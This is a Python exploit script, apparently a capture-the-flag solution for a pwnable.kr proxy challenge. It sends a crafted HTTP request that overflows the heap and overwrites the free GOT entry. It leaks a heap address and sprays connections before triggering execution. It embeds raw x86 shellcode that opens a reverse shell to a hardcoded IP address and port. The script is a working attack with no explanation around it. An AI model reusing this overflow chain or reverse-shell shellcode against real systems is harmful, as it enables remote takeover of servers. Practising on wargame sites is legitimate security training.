from socket import *
from telnetlib import *
import time, struct

p = lambda x: struct.pack("<L", x)
up = lambda x: struct.unpack("<L", x)[0]
HOST = 'pwnable.kr'
PORT = 9903

free_got = 0x0804a0ec
passcode = "admincmd_proxy_dump_log"
offset = 0x8 ## Input
offset2 = 0x64
offset3 = 0x84
shellcode = ("\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2\x68"
            "\xc0\xa8\x78\x88" ## ip
            "\x66\x68"
            "\x05\x39"         ## port
            "\x66\x68\x01\x02\x89"
            "\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9"
            "\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03"
            "\x75\xf0\x31\xc0\x50"
            "\xb8\x44\x44\x44\x44\x35\x2a\x6b\x37\x2c\x50\xb8"
            "\x44\x44\x44\x44\x35\x6b\x6b\x26\x2d\x50\x31\xc0"
            "\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80")

def makeCon(ip, port):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((ip, port))
    return s

s = makeCon(HOST, PORT)
time.sleep(0.3)
payload = "GET http://" + shellcode
payload += "\x90" * (96 - len(shellcode))
payload += p(0x28451248)
payload += p(free_got)
payload += "\x90"*4 + p(0xcafebabe) + "\x90\x90\x90\x90"
payload += ".com 8080\n"

s.send(payload)
s.close()
time.sleep(1)


time.sleep(1)
s = makeCon(HOST, PORT)
time.sleep(0.3)

payload = "GET "
payload += "http://pwnable.kr 8080 "
payload += passcode + "\n"
s.send(payload)
time.sleep(1)
leak = s.recv(10028).split(".com")[1][0:4]
heap_addr = up(leak)
s.close()
print "[*] Memory Leak : " + str(hex(heap_addr))
input_addr = heap_addr + offset
print "[*] Input Address : " + str(hex(input_addr))

for i in range(30):
    s = makeCon(HOST, PORT)
    time.sleep(0.3)
    s.send("GET http://pwnable.kr 8080\n")
    s.close()
    time.sleep(1)

s = makeCon(HOST, PORT)
time.sleep(0.3)
s.send("GET http://" + "A"*124 + p((input_addr + offset2) - offset3)
       + "B"*(243-128) + ".com 8080\n")
time.sleep(0.3)
s.close()

s = makeCon(HOST, PORT)
time.sleep(0.3)
s.send("GET http://" + "A" + ".com 8080\n")
time.sleep(0.3)
s.close()
